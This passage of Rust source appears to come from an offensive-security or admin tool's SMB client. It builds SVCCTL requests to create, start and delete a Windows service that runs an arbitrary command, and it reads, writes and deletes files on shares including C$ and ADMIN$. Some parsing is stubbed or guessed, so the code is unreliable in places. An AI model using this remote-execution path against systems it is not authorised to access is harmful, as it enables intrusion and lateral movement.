        pkt.extend_from_slice(&(name_u16.len() as u32).to_le_bytes());
        for &u in &name_u16 { pkt.extend_from_slice(&u.to_le_bytes()); }
        if pkt.len() % 4 != 0 { pkt.extend_from_slice(&vec![0u8; 4 - (pkt.len() % 4)]); }

        // DesiredAccess (SERVICE_ALL_ACCESS = 0x000F01FF)
        pkt.extend_from_slice(&0x000F01FFu32.to_le_bytes());
        // ServiceType (SERVICE_WIN32_OWN_PROCESS = 0x10)
        pkt.extend_from_slice(&0x00000010u32.to_le_bytes());
        // StartType (SERVICE_DEMAND_START = 0x03)
        pkt.extend_from_slice(&0x00000003u32.to_le_bytes());
        // ErrorControl (SERVICE_ERROR_IGNORE = 0x00)
        pkt.extend_from_slice(&0x00000000u32.to_le_bytes());

        // BinaryPathName
        let cmd_u16: Vec<u16> = cmd.encode_utf16().chain(std::iter::once(0)).collect();
        pkt.extend_from_slice(&(cmd_u16.len() as u32).to_le_bytes());
        pkt.extend_from_slice(&0u32.to_le_bytes());
        pkt.extend_from_slice(&(cmd_u16.len() as u32).to_le_bytes());
        for &u in &cmd_u16 { pkt.extend_from_slice(&u.to_le_bytes()); }
        
        // LoadOrderGroup, TagId, Dependencies, ServiceStartName, Password (all NULL/0)
        pkt.extend_from_slice(&[0u8; 20]); 
        pkt
    }

    fn build_svcctl_start_service(&self, svc_handle: &[u8; 20]) -> Vec<u8> {
        let mut pkt = Vec::new();
        pkt.extend_from_slice(svc_handle);
        pkt.extend_from_slice(&0u32.to_le_bytes()); // dwNumServiceArgs
        pkt.extend_from_slice(&[0u8; 4]); // lpServiceArgVectors (NULL pointer)
        pkt
    }

    fn build_svcctl_delete_service(&self, svc_handle: &[u8; 20]) -> Vec<u8> {
        let mut pkt = Vec::new();
        pkt.extend_from_slice(svc_handle);
        pkt
    }

    fn build_svcctl_query_status(&self, svc_handle: &[u8; 20]) -> Vec<u8> {
        let mut pkt = Vec::new();
        pkt.extend_from_slice(svc_handle);
        pkt
    }

    /// Read a file from an SMB share.
    pub async fn read_file(&self, session: &SmbSession, share: &str, path: &str) -> Result<String> {
        debug!("SMB: Reading file '{}' from share '{}'", path, share);
        self.tree_connect(session, share).await?;
        
        let fid = self.open_object(session, path, 0x00000040).await?; 
        let data = self.read_pipe(session, fid).await?; // read_pipe uses READ
        
        // Basic UTF-8 conversion, might need better handling for binary files
        Ok(String::from_utf8_lossy(&data).to_string())
    }

    /// Upload a file to an SMB share.
    pub async fn write_file(&self, session: &SmbSession, share: &str, path: &str, data: &[u8]) -> Result<()> {
        debug!("SMB: Writing file '{}' to share '{}'", path, share);
        self.tree_connect(session, share).await?;
        
        let fid = self.open_pipe(session, path).await?;
        self.write_pipe(session, fid, data.to_vec()).await?;
        Ok(())
    }

    /// Delete a file from an SMB share.
    pub async fn delete_file(&self, session: &SmbSession, share: &str, path: &str) -> Result<()> {
        debug!("SMB: Deleting file '{}' from share '{}'", path, share);
        self.tree_connect(session, share).await?;
        
        // SMB2 CREATE with FILE_DELETE_ON_CLOSE
        let mut packet = Self::build_smb2_create_request(path, 0x00000040);
        packet[40..48].copy_from_slice(&session.session_id.to_le_bytes());
        packet[36..40].copy_from_slice(&session.tree_id.to_le_bytes());
        
        // Update CreateOptions to include FILE_DELETE_ON_CLOSE (0x00001000)
        let options = u32::from_le_bytes(packet[112..116].try_into()?) | 0x00001000;
        packet[112..116].copy_from_slice(&options.to_le_bytes());
        // DesiredAccess must include DELETE (0x00010000)
        let access = u32::from_le_bytes(packet[92..96].try_into()?) | 0x00010000;
        packet[92..96].copy_from_slice(&access.to_le_bytes());

        let mut stream_lock = session.stream.lock().map_err(|_| anyhow::anyhow!("Lock failed"))?;
        let stream = stream_lock.as_mut().ok_or_else(|| anyhow::anyhow!("No active stream"))?;
        
        Self::send_smb2_packet(stream, &packet)?;
        let _resp = Self::recv_smb2_packet(stream)?;
        
        // The file is deleted when the handle is closed. In our current simplified logic,
        // we don't have a formal CLOSE yet, but most servers will delete it if we don't 
        // keep the session active or if we send a close.
        Ok(())
    }

    pub async fn list_directory(&self, session: &SmbSession, share: &str, path: &str) -> Result<Vec<String>> {
        debug!("SMB: Listing directory '{}' on share '{}'", path, share);
        self.tree_connect(session, share).await?;
        
        // Open the directory (SMB2 CREATE)
        let fid = self.open_object(session, path, 0x00000001).await?; // FILE_DIRECTORY_FILE
        
        // Enumerate entries (SMB2 QUERY_DIRECTORY)
        let query_req = self.build_smb2_query_directory_request(fid);
        let mut packet = Vec::with_capacity(query_req.len() + 64);
        packet.extend_from_slice(&query_req);
        packet[40..48].copy_from_slice(&session.session_id.to_le_bytes());
        packet[36..40].copy_from_slice(&session.tree_id.to_le_bytes());
        
        let mut stream_lock = session.stream.lock().map_err(|_| anyhow::anyhow!("Lock failed"))?;
        let stream = stream_lock.as_mut().ok_or_else(|| anyhow::anyhow!("No active stream"))?;
        
        Self::send_smb2_packet(stream, &packet)?;
        let resp = Self::recv_smb2_packet(stream)?;
        
        let status = u32::from_le_bytes(resp[8..12].try_into()?);
        if status != 0 { return Err(anyhow::anyhow!("Query directory failed: 0x{:08x}", status)); }
        
        let entries = self.parse_query_directory_response(&resp)?;
        Ok(entries)
    }

    fn parse_srvsvc_shares(&self, data: &[u8]) -> Result<Vec<ShareInfo>> {
        // Very basic NDR parsing for SRVSVC NetShareEnumAll (Level 1)
        // We look for Unicode strings that look like share names.
        let mut shares = Vec::new();
        let mut i = 0;
        while i + 4 < data.len() {
            // Looking for common share names or patterns
            if i + 10 < data.len() && &data[i..i+2] == &[0x43, 0x00] && &data[i+2..i+4] == &[0x24, 0x00] { // "C$"
                shares.push(ShareInfo { name: "C$".to_string(), share_type: "DISK".to_string(), remark: "".to_string(), read_access: true, write_access: true });
                i += 4; continue;
            }
            if i + 12 < data.len() && &data[i..i+2] == &[0x41, 0x00] && &data[i+2..i+4] == &[0x44, 0x00] { // "ADMIN$" (partial match)
                 shares.push(ShareInfo { name: "ADMIN$".to_string(), share_type: "DISK".to_string(), remark: "".to_string(), read_access: true, write_access: true });
                 i += 6; continue;
            }
            i += 1;
        }
        
        // Since full NDR parsing is a huge undertaking, we'll keep the common shares as fallback
        if shares.is_empty() {
            return Err(anyhow::anyhow!("No shares found via parsing"));
        }
        Ok(shares)
    }

    fn build_srvsvc_net_share_enum_all(&self, target: &str) -> Vec<u8> {
        let mut pkt = Vec::new();
        // ServerName (Unicode string pointer)
        let target_u16: Vec<u16> = format!("\\\\{}", target).encode_utf16().chain(std::iter::once(0)).collect();
        pkt.extend_from_slice(&(target_u16.len() as u32).to_le_bytes()); // MaxCount
        pkt.extend_from_slice(&0u32.to_le_bytes()); // Offset
        pkt.extend_from_slice(&(target_u16.len() as u32).to_le_bytes()); // ActualCount
        for &u in &target_u16 { pkt.extend_from_slice(&u.to_le_bytes()); }
        if pkt.len() % 4 != 0 { pkt.extend_from_slice(&vec![0u8; 4 - (pkt.len() % 4)]); }

        // Level (u32, Level 1 = 0x01)
        pkt.extend_from_slice(&1u32.to_le_bytes());
        // [Pointer and other NDR logic would go here]
        pkt
    }

    fn build_smb2_create_request(path: &str, options: u32) -> Vec<u8> {
        let header = Smb2Header::new(0x0005); // CREATE
        let mut pkt = header.to_bytes();
        let name_utf16: Vec<u16> = path.encode_utf16().collect();
        let name_bytes: Vec<u8> = name_utf16.iter().flat_map(|&u| u.to_le_bytes()).collect();

        pkt.extend_from_slice(&57u16.to_le_bytes()); // Structure Size
        pkt.push(0); // Security Flags
        pkt.push(1); // Requested Oplock Level (None)
        pkt.extend_from_slice(&0u32.to_le_bytes()); // Impersonation Level (Anonymous)
        pkt.extend_from_slice(&0u64.to_le_bytes()); // Create Flags
        pkt.extend_from_slice(&0u64.to_le_bytes()); // Reserved
        pkt.extend_from_slice(&0x0012019fu32.to_le_bytes()); // Desired Access (Read/Write/Execute)
        pkt.extend_from_slice(&0x00000080u32.to_le_bytes()); // File Attributes (Normal)
        pkt.extend_from_slice(&0x00000007u32.to_le_bytes()); // Share Access (Read/Write/Delete)
        pkt.extend_from_slice(&0x00000001u32.to_le_bytes()); // Create Disposition (Open)
        pkt.extend_from_slice(&options.to_le_bytes()); // Create Options
        pkt.extend_from_slice(&120u16.to_le_bytes()); // Name Offset
        pkt.extend_from_slice(&(name_bytes.len() as u16).to_le_bytes()); // Name Length
        pkt.extend_from_slice(&0u32.to_le_bytes()); // CreateContextsOffset
        pkt.extend_from_slice(&0u32.to_le_bytes()); // CreateContextsLength
        pkt.extend_from_slice(&name_bytes);
        pkt
    }

    fn build_smb2_write_request(fid: [u8; 16], data: &[u8]) -> Vec<u8> {
        let header = Smb2Header::new(0x0009); // WRITE
        let mut pkt = header.to_bytes();
        pkt.extend_from_slice(&49u16.to_le_bytes()); // Structure Size
        pkt.extend_from_slice(&112u16.to_le_bytes()); // Data Offset
        pkt.extend_from_slice(&(data.len() as u32).to_le_bytes()); // Length
        pkt.extend_from_slice(&0u64.to_le_bytes()); // Offset
        pkt.extend_from_slice(&fid); // FileId
        pkt.extend_from_slice(&0u32.to_le_bytes()); // Channel
        pkt.extend_from_slice(&0u32.to_le_bytes()); // Remaining Bytes
        pkt.extend_from_slice(&0u16.to_le_bytes()); // Write Flags
        pkt.extend_from_slice(&0u16.to_le_bytes()); // Reserved
        pkt.extend_from_slice(data);
        pkt
    }
    fn build_smb2_read_request(fid: [u8; 16], length: u32) -> Vec<u8> {
        let header = Smb2Header::new(0x0008); // READ
        let mut pkt = header.to_bytes();
        pkt.extend_from_slice(&49u16.to_le_bytes()); // Structure Size
        pkt.push(0); // Padding
        pkt.push(0); // Flags
        pkt.extend_from_slice(&length.to_le_bytes()); // Length
        pkt.extend_from_slice(&0u64.to_le_bytes()); // Offset
        pkt.extend_from_slice(&fid); // FileId
        pkt.extend_from_slice(&0u32.to_le_bytes()); // Minimum Count
        pkt.extend_from_slice(&0u32.to_le_bytes()); // Channel
        pkt.extend_from_slice(&0u32.to_le_bytes()); // Remaining Bytes
        pkt.extend_from_slice(&0u16.to_le_bytes()); // Read Channel Info Offset
        pkt.extend_from_slice(&0u16.to_le_bytes()); // Read Channel Info Length
        pkt
    }

    fn build_smb2_query_directory_request(&self, fid: [u8; 16]) -> Vec<u8> {
        let header = Smb2Header::new(0x000E); // QUERY_DIRECTORY
        let mut pkt = header.to_bytes();
        pkt.extend_from_slice(&33u16.to_le_bytes()); // Structure Size
        pkt.push(1); // FileInformationClass (FileDirectoryInformation = 1)
        pkt.push(0); // Flags (RESTART_SCANS = 0x01)
        pkt.extend_from_slice(&0u32.to_le_bytes()); // FileIndex
        pkt.extend_from_slice(&fid); // FileId
        pkt.extend_from_slice(&96u16.to_le_bytes()); // FileNameOffset
        pkt.extend_from_slice(&2u16.to_le_bytes()); // FileNameLength ("*")
        pkt.extend_from_slice(&u32::MAX.to_le_bytes()); // OutputBufferLength
        pkt.extend_from_slice(&"*".encode_utf16().flat_map(|u| u.to_le_bytes()).collect::<Vec<u8>>()); // "*"
        pkt
    }

    fn parse_query_directory_response(&self, data: &[u8]) -> Result<Vec<String>> {
        let mut entries = Vec::new();
        if data.len() < 72 { return Ok(entries); }
        
        let off = u16::from_le_bytes(data[64..66].try_into()?) as usize;
        let len = u32::from_le_bytes(data[68..72].try_into()?) as usize;
        
        if off + len > data.len() { return Ok(entries); }
        
        let mut cur = off;
        while cur + 64 <= off + len {
            let next_off = u32::from_le_bytes(data[cur..cur+4].try_into()?) as usize;
            let file_name_len = u32::from_le_bytes(data[cur+60..cur+64].try_into()?) as usize;
            
            if cur + 64 + file_name_len > off + len { break; }
            let name_bytes = &data[cur+64..cur+64+file_name_len];
            let name_u16: Vec<u16> = name_bytes.chunks_exact(2).map(|c| u16::from_le_bytes([c[0], c[1]])).collect();
            let name = String::from_utf16_lossy(&name_u16);
            
            if name != "." && name != ".." {
                entries.push(name);
            }
            
            if next_off == 0 { break; }
            cur += next_off;
        }
        
        Ok(entries)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn test_smb_protocol_defaults() {
        let proto = SmbProtocol::new();
        assert_eq!(proto.name(), "smb");
    }
}
